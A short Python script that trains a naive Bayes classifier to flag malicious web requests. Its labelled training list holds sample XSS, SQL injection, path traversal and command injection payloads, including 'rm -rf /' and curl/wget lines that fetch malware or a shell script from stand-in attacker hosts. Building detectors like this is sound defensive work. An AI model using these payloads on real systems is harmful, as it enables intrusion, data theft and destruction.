from sklearn.feature_extraction.text import CountVectorizer
from sklearn.naive_bayes import MultinomialNB
import pickle

# Training data
data = [
    # Normal requests (Label 0)
    "normal request",
    "home page",
    "login page",
    "safe request",
    "/index.html",
    "/static/style.css",
    "/api/users?id=12",
    "/dashboard?user=guest",
    "/assets/logo.png",
    "hello world",
    "username=alice&password=secretpassword",
    "GET /api/v1/status HTTP/1.1",
    "search?q=cyber+security",
    
    # Attack payloads (Label 1)
    "<script>alert(1)</script>",
    "SELECT * FROM users",
    "' OR 1=1 --",
    "../../etc/passwd",
    "DROP TABLE users",
    "UNION SELECT password",
    "<img src=x onerror=alert(document.cookie)>",
    "javascript:alert(1)",
    "SELECT username, password FROM members",
    "admin' OR '1'='1",
    "../../../../windows/win.ini",
    "boot.ini",
    "; rm -rf /",
    "; whoami",
    "&& ls -la",
    "curl http://attacker.com/malware",
    "wget http://malicious-site.com/shell.sh"
]

# Labels
labels = [
    0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,  # 13 normal examples
    1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1  # 17 attack examples
]

# Vectorizer
vectorizer = CountVectorizer()

X = vectorizer.fit_transform(data)

# Train model
model = MultinomialNB()

model.fit(X, labels)

# Save model properly
with open("model.pkl", "wb") as f:
    pickle.dump((vectorizer, model), f)

print("Model Created Successfully")
